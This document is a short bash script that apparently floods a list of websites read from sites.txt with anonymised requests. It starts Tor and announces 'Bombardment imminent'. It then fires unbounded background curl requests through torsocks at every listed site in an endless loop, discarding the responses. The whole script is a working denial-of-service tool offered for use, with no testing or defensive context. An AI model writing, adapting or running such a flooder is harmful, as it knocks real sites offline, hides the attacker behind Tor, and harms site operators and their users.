trap 'exit 130' INT

echo "Reading provided sites..."
sites=$(grep -v '^#' sites.txt)
echo "Found: $sites"
echo "Starting Tor, will wait for 10 seconds for it to establish circuit"
tor &> tor.logs &
sleep 10
echo "Bombardment imminent"
i=0
while true; do
    for site in $sites; do
        torsocks curl -s -o /dev/null -w "%{http_code}" $site &> /dev/null &
    done
    i=$(( $i+1 ))
    echo -ne "Iteration: $i \r"
done